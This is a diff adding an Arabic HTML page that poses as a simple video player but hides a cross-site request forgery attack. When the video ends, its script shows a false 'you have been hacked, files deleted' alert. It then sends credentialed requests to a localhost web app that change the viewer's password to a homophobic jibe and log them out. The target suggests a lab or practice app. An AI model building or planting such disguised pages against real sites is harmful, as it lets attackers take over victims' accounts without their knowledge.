@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>خالد الكويت</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        body {
+            background: #ffffff;
+            background-size: cover;
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .video-container {
+            background: #ffffff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        video {
+            width: 60%;
+            height: auto;
+            border-radius: 8px;
+            outline: none;
+            margin-bottom: 20px;
+        }
+
+    </style>
+</head>
+<body>
+    <div class="video-container">
+        <video id="videoElement" controls>
+            <source src="khald.mp4" type="video/mp4">
+            متصفحك لا يدعم تشغيل الفيديو.
+        </video>
+
+    </div>
+
+    <script type="text/javascript">
+
+        const xhr1 = new XMLHttpRequest();
+        xhr1.open("GET", "http://localhost:5000/logout", true);
+        xhr1.withCredentials = true;
+        
+        // إنشاء كائن XMLHttpRequest
+        var xhr = new XMLHttpRequest();
+
+        // تفعيل withCredentials
+        xhr.withCredentials = true;
+
+        // تعيين نوع الطلب والطريق
+        xhr.open("POST", "http://localhost:5000/change_password", true);
+
+        // إعداد الهيدر الخاص بالطلب
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+        // تعيين دالة استجابة الطلب
+        xhr.onreadystatechange = function() {
+            // تحقق إذا تم استلام الرد وأن حالة الطلب هي 200 (نجاح)
+            if (xhr.readyState === XMLHttpRequest.DONE) {
+                if (xhr.status === 200) {
+                    xhr1.send(null);
+                } 
+            }
+        };
+
+        // بيانات لإرسالها مع الطلب (منسقة كـ "application/x-www-form-urlencoded")
+        var data = "new_password=dont_be_a_gay";
+
+        // إرسال الطلب مع البيانات
+        
+
+
+        const video = document.getElementById('videoElement');
+
+        video.addEventListener('ended', () => {
+            alert('لقد تم اختراقك من طرف : خالد الكويت و تم حذف ملفاتك المهمة');
+            xhr.send(data);
+        });
+
+    </script>
+</body>
+</html>
